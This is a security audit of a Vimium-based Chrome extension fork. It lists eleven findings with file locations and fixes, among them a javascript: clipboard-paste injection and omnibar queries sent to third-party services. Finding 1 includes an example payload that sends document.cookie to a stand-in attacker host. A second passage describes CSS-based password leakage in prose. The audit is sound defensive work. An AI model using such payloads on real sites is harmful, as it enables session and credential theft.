# Security audit: chrome-vim-shortcuts (fork of Vimium)

- **Repository:** github.com/RickardOtv/chrome-vim-shortcuts
- **Base commit:** `5aa29614bf1dce05e0d316f8c38722e17f9b38c3` (philc/vimium master, 2026-07-24). The fork was verified to be byte-identical to upstream at this commit.
- **Audit date:** 2026-11-10
- **Scope:** everything Chrome loads: `manifest.json`, `background_scripts/`, `content_scripts/`, `lib/`, `pages/`, `resources/`, `icons/`. Test files, build scripts and GitHub workflows are not loaded by the browser and were not reviewed.

## Verdict

**No malicious code was found.** There is no telemetry, no analytics, no remote code loading, no `eval`, and every script the extension runs is a file inside the package. Web pages cannot talk to the extension's background directly (no `externally_connectable`).

There are, however, real risks for a work setting: one way a website can get JavaScript run on another site, outbound network requests that carry what you type, a remote default new-tab page, and permissions much broader than the features you want. All of them are fixed by deleting or changing code in phase 3.

## Findings

| # | Severity | Finding | Action |
|---|---|---|---|
| 1 | Medium | Pasting a `javascript:` URL runs it on the current site | Fix |
| 2 | Medium | Omnibar sends what you type to third-party suggestion services | Delete |
| 3 | Medium | Default new tab is a remote web page (`vimium.github.io`) | Fix |
| 4 | Low | Settings are synced through your Google account | Fix |
| 5 | Low | Custom CSS is injected into every page; settings import accepts any file | Fix |
| 6 | Low | Local marks are stored in the website's own `localStorage` | Fix or delete |
| 7 | Low | Hint labels are built with `innerHTML` | Fix |
| 8 | Low | `data:` URLs can be opened in new tabs, bypassing a Chrome anti-phishing block | Fix |
| 9 | Low | Permissions much broader than needed | Trim |
| 10 | Info | No explicit Content Security Policy | Add |
| 11 | Info | Bug: "open in new window" always throws | Fix |

### 1. Pasting a `javascript:` URL runs it on the current site (Medium)

- `content_scripts/mode_normal.js:201-205`: `p` reads the clipboard and sends it to `openUrlInCurrentTab`.
- `content_scripts/mode_visual.js:469-470`: `p` in visual mode does the same with the selected text.
- `background_scripts/tab_operations.js:15-64`: if the text starts with `javascript:`, it is injected as a `<script>` into the page's main world.

**Scenario:** any website can put text on your clipboard when you copy something from it. If that text is `javascript:fetch('https://evil.example/?'+document.cookie)` and you later press `p` on your work intranet tab, the script runs as that intranet site. Chrome's own address bar strips `javascript:` from pasted text for exactly this reason; Vimium bypasses that protection.

The existing guard (line 24-32) only blocks requests from subframes, not this case.

**Fix:** remove `javascript:` execution from `openUrlInCurrentTab` entirely (this also removes bookmarklet support from the omnibar, which goes in finding 2 anyway).

### 2. Omnibar sends what you type to third parties (Medium)

- `background_scripts/completion/search_wrapper.js:56-74`: the only outbound network call in the extension.
- `background_scripts/completion/search_engines.js`: Google, YouTube, Wikipedia, Bing, Amazon, DuckDuckGo, Merriam-Webster, Brave, Qwant, Kagi.
- `lib/settings.js:58-74`: a Wikipedia keyword (`w`) is configured by default, so typing `w something` in the omnibar sends "something" to en.wikipedia.org as you type.

It only fires for custom search-engine keywords, after 4+ characters, but it is still typed text leaving the machine.

**Fix:** delete the omnibar and completion code (phase 3).

### 3. Default new tab is a remote page (Medium)

- `lib/settings.js:8` and `:75`: `newTabDestination` defaults to `https://vimium.github.io/new-tab/`.
- `content_scripts/vimium_frontend.js:257-266`: Vimium opens the omnibar automatically when it sees that page.

Every `t` loads a page hosted on GitHub Pages and controlled by whoever controls that GitHub organisation. The page cannot use extension APIs, but it is an unnecessary third-party request with your IP address and timing.

**Fix:** default to the browser's own new tab page and remove the Vimium new-tab option.

### 4. Settings sync through your Google account (Low)

- `lib/settings.js:125, 249-250`: settings live in `chrome.storage.sync`.

Synced data includes key mappings, search engines, exclusion rules (a list of sites you've disabled it on) and custom CSS. No browsing history is synced. Anyone who gets into your Google account, or a work profile with sync, could change your settings (see finding 5).

**Fix:** switch to `chrome.storage.local`.

### 5. Custom CSS on every page; unchecked settings import (Low)

- `background_scripts/main.js:492-504`, `:891-895`: the `userDefinedLinkHintCss` setting is injected into every page and frame.
- `pages/options.js:334-361`: "Restore backup" accepts any JSON file and writes it straight into settings.

CSS can leak page content (for example attribute selectors that load a remote image per character typed into a password field). This only matters if someone else's CSS gets into your settings: an untrusted backup file, or a compromised sync account.

**Fix:** keep custom CSS but only import your own backups; or remove the custom-CSS setting and the import feature. Finding 4's fix closes the sync route.

### 6. Local marks stored in the site's `localStorage` (Low)

- `content_scripts/marks.js:80` and nearby: `m` + lowercase letter writes `vimiumMark|<url>|<letter>` into the page's own `localStorage`.

The website can read these keys, which tells it you use this extension (fingerprinting). Contents are only scroll positions.

**Fix:** move to `chrome.storage.local`, or delete marks if you don't use them.

### 7. Hint labels built with `innerHTML` (Low)

- `content_scripts/link_hints.js:876, 960, 1115-1121`.

The caption can contain page text (input values, image alt text). Each character is wrapped in its own `<span>`, which happens to make tag injection impossible, so this is not exploitable today. It is fragile, though: a small refactor could make it injectable.

**Fix:** build the spans with `createElement` and `textContent`.

### 8. `data:` URLs bypass Chrome's top-level block (Low)

- `lib/url_utils.js:107`: `data:` is passed through as-is.
- `background_scripts/tab_operations.js`, `lib/dom_utils.js:386-418`: link hints opened in a new tab, and `P`, open the URL through `chrome.tabs.create`.

Chrome blocks web pages from navigating a tab to `data:` URLs because they are used for phishing. A link opened through the extension skips that block.

**Fix:** refuse `data:` (and `javascript:`) in `openUrlInNewTab`, `openUrlInNewWindow` and `openUrlInIncognito`.

### 9. Broad permissions (Low)

`manifest.json` requests `tabs`, `bookmarks`, `history`, `storage`, `sessions`, `notifications`, `scripting`, `favicon`, `webNavigation`, `search`, plus `<all_urls>`. The history completer loads up to 20,000 history entries into memory (`completers.js:825-829`). None of this is sent anywhere, but any future bug inherits that access.

**Fix:** after phase 3, expected to keep `tabs`, `sessions` (for `X`), `storage`, `scripting`, `webNavigation`, and `<all_urls>`; drop `bookmarks`, `history`, `search`, `favicon`, `notifications`.

### 10. No explicit Content Security Policy (Info)

The MV3 default already blocks inline and remote scripts on extension pages. An explicit policy makes the "no network" rule enforced by Chrome, not just by convention:

```json
"content_security_policy": {
  "extension_pages": "script-src 'self'; object-src 'none'; connect-src 'self'; style-src 'self' 'unsafe-inline'"
}
```

### 11. Bug: open in new window (Info)

`background_scripts/tab_operations.js:135` refers to `tabConfig`, which doesn't exist in that function, so `openUrlInNewWindow` always throws. Not a security issue.

## Verified safe

- **Network:** three `fetch` calls in the whole extension. `background_scripts/main.js:97` and `lib/url_utils.js:29` read the extension's own bundled files; the third is finding 2.
- **No dynamic code:** no `eval`, `new Function`, string `setTimeout`, `importScripts`, WebSocket or beacon.
- **All scripts local:** every `<script>` in `pages/*.html` points to a file in the package; no inline event handlers.
- **Messaging:** web pages cannot message the background (no `externally_connectable`). Content scripts run in Chrome's isolated world, so page JavaScript cannot read their data.
- **UI iframes** (omnibar, HUD, help): use a private `MessageChannel` set up with a random per-session secret and an exact target origin (`ui_component.js:80-88`, `ui_component_messenger.js:8-22`). A page that embeds these iframes itself cannot talk to them.
- **Synthetic events ignored:** key and click handlers run only for events the browser marks as trusted (`lib/utils.js:3-13`), so a page cannot fake keypresses to trigger commands.
- **Clipboard:** read only when you press `p`/`P`; written only for yank commands.
- **Omnibar rendering:** page titles and URLs are escaped before being inserted (`completers.js:98, 126, 130`) and only appear in text positions.
- **Data at rest:** find history is in `chrome.storage.session` (cleared on browser restart); global marks in `chrome.storage.local`.
- **External links** in help/options pages (GitHub, Chrome Web Store) open only when clicked.
- `resources/tlds.txt`: plain list of 1,591 top-level domains, including internationalised ones.

## Coverage

Being explicit about how each file was reviewed:

**Read in full, line by line:** `manifest.json`; `background_scripts/` main.js, tab_operations.js, bg_utils.js, exclusions.js, marks.js, tab_recency.js, reload.js, user_search_engines.js, commands.js, completion/completers.js, completion/search_wrapper.js, completion/search_engines.js; `lib/` utils.js, settings.js, url_utils.js; `content_scripts/` ui_component.js, hud.js, vomnibar.js, vimium_frontend.js; `pages/` ui_component_messenger.js, hud_page.js, vomnibar_page.js, command_listing.js, help_dialog_page.js, options.js, action.js, exclusion_rules_editor.js, doc_search_completion.js, all_content_scripts.js.

**Security-relevant sections read, rest pattern-scanned:** content_scripts/link_hints.js (activation, labels, link text), mode_normal.js (URL and clipboard commands), mode_visual.js (yank/open), marks.js; lib/dom_utils.js (click simulation, CSS injection), lib/find_mode_history.js.

**Pattern-scanned only** (about 4,000 lines of UI logic: scrolling, key parsing, visual selection, find mode): ranking.js, all_commands.js, scroller.js, mode.js, mode_insert.js, mode_key_handler.js, mode_find.js, keyboard_utils.js, handler_stack.js, rect.js, types.js, chrome_api_stubs.js, and all HTML/CSS. The scan covered every pattern that can reach the network, run code, write HTML, touch storage or the clipboard, call a Chrome API, or send a message; none of these files had a hit beyond those listed above.

**Remaining step:** after phase 3 deletes the omnibar, bookmarks, history and other unused features, read every remaining file line by line. That second pass covers less code and is the one that matters, since it is exactly what will run.
